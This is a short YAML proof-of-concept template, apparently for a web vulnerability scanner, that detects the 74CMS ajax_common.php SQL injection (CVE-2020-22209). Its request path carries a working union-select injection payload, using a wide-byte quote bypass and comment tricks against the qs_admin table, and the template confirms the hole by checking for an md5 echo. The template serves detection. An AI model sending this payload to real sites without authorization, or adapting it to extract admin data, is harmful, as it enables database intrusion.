name: poc-yaml-74cms-sqli-cve-2020-22209
binding: ae8d5b98-71b9-42a6-bff3-00534d1872fb
manual: true
detail:
    author: Aurora
    links:
        - https://www.cvedetails.com/cve/CVE-2020-22209/
    description: 74CMS ajax_common.php SQL injection.
    vulnerability:
        id: CT-157068
        level: critical
transport: http
set:
    r1: string(randomInt(2000000, 4000000))
rules:
    r1:
        request:
            method: GET
            path: /plus/ajax_common.php?act=hotword&query=%E9%8C%A6%27union+/*!50000SeLect*/+1,md5({{r1}}),3+from+qs_admin%23--
            follow_redirects: true
        expression: response.status == 200 && response.body.bcontains(bytes(md5(r1)))
expression: r1()
